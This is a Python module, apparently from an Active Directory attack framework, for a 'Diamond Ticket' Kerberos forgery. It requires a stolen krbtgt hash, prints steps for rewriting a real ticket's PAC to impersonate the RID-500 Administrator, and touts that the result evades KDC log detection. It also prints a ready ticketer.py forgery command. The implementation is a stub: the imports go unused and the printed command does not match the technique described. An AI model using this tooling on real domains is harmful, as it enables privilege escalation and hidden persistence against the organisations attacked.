"""Diamond Ticket — modify legitimate TGT PAC for stealthier persistence."""
from __future__ import annotations
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.attack.diamond_ticket.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_ticket_modify", "kdc_request"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.001"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", args.target)
    krbtgt_hash = getattr(args, "krbtgt_hash", None)
    target_rid = getattr(args, "target_rid", "500")
    impersonate = getattr(args, "impersonate", "Administrator")

    if not krbtgt_hash:
        print("[!] --krbtgt-hash required (for PAC re-signing)", file=sys.stderr)
        return 1

    print("[*] Diamond Ticket (PAC modification):")
    print("  DC:          {}".format(dc_ip))
    print("  Impersonate: {} (RID {})".format(impersonate, target_rid))
    print("  Technique:   Request real TGT → modify PAC → re-sign with krbtgt")
    print()
    print("[*] Step 1: Request legitimate TGT as {}\\{}".format(args.domain, cred.username))
    print("[*] Step 2: Decrypt PAC with krbtgt key")
    print("[*] Step 3: Modify PAC — set RID={}, add group SIDs".format(target_rid))
    print("[*] Step 4: Re-sign PAC and re-encrypt TGT")
    print()
    print("[+] Diamond Ticket is stealthier than Golden Ticket:")
    print("  - Uses real TGT (valid timestamps, nonce, etc.)")
    print("  - Only modifies PAC (privilege data)")
    print("  - Harder to detect: ticket looks legitimate to KDC logs")
    print()

    try:
        from impacket.krb5.kerberosv5 import getKerberosTGT
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal

        print("[*] Requesting TGT for {}...".format(cred.username))
        print("[*] Use ticketer.py with -diamond flag for full implementation")
        print("[*] impacket ticketer.py -nthash {} -domain-sid <SID> "
              "-domain {} -user-id {} {}".format(
                  krbtgt_hash, args.domain, target_rid, impersonate))
        return 0
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1
